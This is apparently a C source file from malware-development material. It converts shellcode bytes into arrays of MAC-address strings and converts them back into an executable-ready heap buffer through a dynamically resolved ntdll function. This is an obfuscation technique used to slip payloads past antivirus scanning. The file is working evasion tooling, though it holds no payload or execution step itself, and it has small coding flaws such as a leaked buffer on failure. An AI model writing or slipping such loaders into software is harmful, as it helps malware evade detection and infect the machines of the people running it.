#include <stdio.h>
#include <Windows.h>

BOOL GenerateMAC(int a, int b, int c, int d, int e, int f,
	char* out, size_t outSize) {
	if (out == NULL || outSize < 18) {   // "XX-XX-XX-XX-XX-XX" + NUL = 18
		return FALSE;
	}
	int n = sprintf_s(out, outSize,
		"%02X-%02X-%02X-%02X-%02X-%02X",
		a & 0xFF, b & 0xFF, c & 0xFF,
		d & 0xFF, e & 0xFF, f & 0xFF);
	return n > 0;
}

// Generate the MAC output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer

BOOL GenerateMacOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
	if (pShellcode == NULL || ShellcodeSize == 0 || ShellcodeSize % 6 != 0) {
		return FALSE;
	}

	printf("char* MacArray [%zu] = {\n\t", ShellcodeSize / 6);

	char Mac[18];                    // "XX-XX-XX-XX-XX-XX" + NUL
	SIZE_T counter = 0;

	for (SIZE_T i = 0; i + 5 < ShellcodeSize; i += 6) {
		if (!GenerateMAC(pShellcode[i], pShellcode[i + 1],
			pShellcode[i + 2], pShellcode[i + 3],
			pShellcode[i + 4], pShellcode[i + 5],
			Mac, sizeof(Mac))) {
			// Malformed state — don't emit partial output
			printf("\n};\n\n");
			return FALSE;
		}

		counter++;

		// If this is the last MAC, no trailing comma
		if (i + 6 >= ShellcodeSize) {
			printf("\"%s\"", Mac);
		}
		else {
			printf("\"%s\", ", Mac);
		}

		// Beautify: newline after every 6 entries, except after the last
		if (counter % 6 == 0 && i + 6 < ShellcodeSize) {
			printf("\n\t");
		}
	}

	printf("\n};\n\n");
	return TRUE;
}

typedef NTSTATUS(NTAPI* fnRtlEthernetStringToAddressA)(
	PCSTR		S,
	PCSTR* Terminator,
	PVOID		Addr
	);

BOOL MacDeobfuscation(IN CHAR* MacArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {
	PBYTE          pBuffer = NULL, TmpBuffer = NULL;
	SIZE_T         sBuffSize = NULL;
	PCSTR          Terminator = NULL;
	NTSTATUS       STATUS = NULL;

	// Getting RtlEthernetStringToAddressA address from ntdll.dll
	fnRtlEthernetStringToAddressA pRtlEthernetStringToAddressA = (fnRtlEthernetStringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlEthernetStringToAddressA");
	if (pRtlEthernetStringToAddressA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the real size of the shellcode which is the number of MAC addresses * 6
	sBuffSize = NmbrOfElements * 6;


	// Allocating memeory which will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	TmpBuffer = pBuffer;
	// Loop through all the MAC addresses saved in MacArray
	for (int i = 0; i < NmbrOfElements; i++) {

		// Deobfuscating one MAC address at a time
		// MacArray[i] is a single Mac address from the array MacArray
		if ((STATUS = pRtlEthernetStringToAddressA(MacArray[i], &Terminator, TmpBuffer)) != 0x0) {
			// if it failed
			printf("[!] RtlEthernetStringToAddressA Failed At [%s] With Error 0x%0.8X", MacArray[i], STATUS);
			return FALSE;
		}

		// 6 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 6 to store the
		TmpBuffer = (PBYTE)(TmpBuffer + 6);

	}

	// Save the base address & size of the deobfuscated payload
	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;
	return TRUE;

}